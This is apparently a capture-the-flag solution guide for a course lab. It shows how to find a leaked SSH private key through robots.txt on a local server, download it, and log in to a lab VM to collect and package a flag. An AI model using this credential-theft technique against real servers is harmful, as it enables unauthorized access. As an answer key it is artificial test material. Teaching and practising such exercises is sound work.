# Testing and Solution Guide

## Problem 1: Gain Access

### Summary
Goal: Obtain an unprivileged shell as `p1` and extract the flag from the home directory.
Hint: Look for information leakage on a public server that helps you connect.

### Steps
1. Discover the leak via `robots.txt`:
```bash
curl http://localhost:8000/robots.txt
```
2. Download the leaked SSH key and fix permissions:
```bash
curl -o id_rsa http://localhost:8000/backup/id_rsa
chmod 600 id_rsa
```
3. SSH into the VM as `p1`:
```bash
ssh -i id_rsa -p 2222 p1@localhost
```
4. Generate submission files inside the VM:
```bash
ctf-extract
```
5. Package files for submission:
```bash
tar -czf 2022CSZ123456-P1.tar.gz public.txt private.txt flag.txt key.txt
```
